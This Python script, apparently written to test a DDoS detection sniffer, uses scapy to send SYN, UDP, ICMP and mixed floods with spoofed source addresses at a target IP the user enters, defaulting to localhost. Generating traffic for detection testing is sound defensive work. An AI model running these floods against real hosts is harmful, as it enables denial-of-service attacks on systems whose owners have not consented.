"""
Synthetic attack traffic generator for testing DDoS detection.
Creates malicious packet patterns that the sniffer will detect as attacks.
Requires: scapy, Windows admin or Linux sudo
"""

import warnings
warnings.filterwarnings('ignore', category=UserWarning, module='sklearn')

try:
    from scapy.all import IP, TCP, UDP, ICMP, send, Raw
    import random
    import time
    import sys
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("✗ Scapy not installed. Install with: pip install scapy")

def generate_syn_flood(target_ip, target_port, count=100, interval=0.01):
    """Generate SYN flood packets (classic DDoS attack)."""
    print(f"\n[SYN FLOOD] Attacking {target_ip}:{target_port}")
    print(f"  Sending {count} SYN packets...")
    
    for i in range(count):
        # Spoof source IP
        src_ip = f"10.0.{random.randint(0, 255)}.{random.randint(1, 255)}"
        
        # Create SYN packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(
            sport=random.randint(1024, 65535),
            dport=target_port,
            flags="S",  # SYN flag
            seq=random.randint(0, 2**32-1)
        )
        
        try:
            send(packet, verbose=0)
            if (i + 1) % 20 == 0:
                print(f"    Sent {i + 1}/{count} packets")
        except PermissionError:
            print("  ✗ Requires admin/root privileges")
            return
        except Exception as e:
            print(f"  ✗ Error: {e}")
            return
        
        time.sleep(interval)
    
    print(f"  ✓ SYN flood complete")

def generate_udp_flood(target_ip, target_port, count=100, packet_size=512, interval=0.01):
    """Generate UDP flood packets."""
    print(f"\n[UDP FLOOD] Attacking {target_ip}:{target_port}")
    print(f"  Sending {count} UDP packets ({packet_size} bytes each)...")
    
    for i in range(count):
        src_ip = f"10.0.{random.randint(0, 255)}.{random.randint(1, 255)}"
        
        packet = IP(src=src_ip, dst=target_ip) / UDP(
            sport=random.randint(1024, 65535),
            dport=target_port
        ) / Raw(load='X' * packet_size)
        
        try:
            send(packet, verbose=0)
            if (i + 1) % 20 == 0:
                print(f"    Sent {i + 1}/{count} packets")
        except PermissionError:
            print("  ✗ Requires admin/root privileges")
            return
        except Exception as e:
            print(f"  ✗ Error: {e}")
            return
        
        time.sleep(interval)
    
    print(f"  ✓ UDP flood complete")

def generate_icmp_flood(target_ip, count=100, interval=0.01):
    """Generate ICMP flood (ping flood)."""
    print(f"\n[ICMP FLOOD] Attacking {target_ip}")
    print(f"  Sending {count} ICMP packets...")
    
    for i in range(count):
        src_ip = f"10.0.{random.randint(0, 255)}.{random.randint(1, 255)}"
        
        packet = IP(src=src_ip, dst=target_ip) / ICMP()
        
        try:
            send(packet, verbose=0)
            if (i + 1) % 20 == 0:
                print(f"    Sent {i + 1}/{count} packets")
        except PermissionError:
            print("  ✗ Requires admin/root privileges")
            return
        except Exception as e:
            print(f"  ✗ Error: {e}")
            return
        
        time.sleep(interval)
    
    print(f"  ✓ ICMP flood complete")

def generate_mixed_attack(target_ip, duration=10):
    """Generate mixed attack traffic for longer period."""
    print(f"\n[MIXED ATTACK] Sustained attack on {target_ip}")
    print(f"  Duration: {duration} seconds")
    print(f"  (Combine SYN, UDP, ICMP from randomized spoofed IPs)\n")
    
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < duration:
            attack_type = random.choice(['syn', 'udp', 'icmp'])
            
            if attack_type == 'syn':
                src_ip = f"10.0.{random.randint(0, 255)}.{random.randint(1, 255)}"
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice([80, 443, 8080]),
                    flags="S",
                    seq=random.randint(0, 2**32-1)
                )
            elif attack_type == 'udp':
                src_ip = f"10.0.{random.randint(0, 255)}.{random.randint(1, 255)}"
                packet = IP(src=src_ip, dst=target_ip) / UDP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice([53, 123, 161])
                ) / Raw(load='X' * 512)
            else:  # icmp
                src_ip = f"10.0.{random.randint(0, 255)}.{random.randint(1, 255)}"
                packet = IP(src=src_ip, dst=target_ip) / ICMP()
            
            send(packet, verbose=0)
            packet_count += 1
            
            if packet_count % 50 == 0:
                elapsed = time.time() - start_time
                rate = packet_count / elapsed
                print(f"  Sent {packet_count} packets ({rate:.1f} pps)")
            
            time.sleep(0.001)  # Fast rate
    
    except PermissionError:
        print("  ✗ Requires admin/root privileges")
    except KeyboardInterrupt:
        print(f"\n  Stopped after {packet_count} packets")
    except Exception as e:
        print(f"  ✗ Error: {e}")

def main():
    if not SCAPY_AVAILABLE:
        print("✗ Scapy not available")
        return
    
    print("\n=== DDoS Attack Simulator ===")
    print("Generates synthetic malicious traffic for testing detection")
    print("Requires: Admin (Windows) or sudo (Linux/Mac)\n")
    
    # Get target IP (default: localhost gateway)
    target = input("Target IP [127.0.0.1]: ").strip() or "127.0.0.1"
    
    print("\nAttack types:")
    print("  1. SYN flood (port 80)")
    print("  2. UDP flood (port 53)")
    print("  3. ICMP flood")
    print("  4. Mixed attack (10 seconds)")
    print("  5. All attacks (sequence)")
    
    choice = input("\nSelect [1-5]: ").strip()
    
    try:
        if choice == '1':
            generate_syn_flood(target, 80, count=150)
        elif choice == '2':
            generate_udp_flood(target, 53, count=150)
        elif choice == '3':
            generate_icmp_flood(target, count=150)
        elif choice == '4':
            generate_mixed_attack(target, duration=10)
        elif choice == '5':
            generate_syn_flood(target, 80, count=100)
            time.sleep(2)
            generate_udp_flood(target, 53, count=100)
            time.sleep(2)
            generate_icmp_flood(target, count=100)
        else:
            print("Invalid selection")
            return
        
        print("\n✓ Attack simulation complete")
        print("\nIf sniffer is running, it should flag the attacking IPs as ATTACK\n")
    
    except KeyboardInterrupt:
        print("\n\nStopped")
    except Exception as e:
        print(f"\n✗ Error: {e}")

if __name__ == '__main__':
    main()
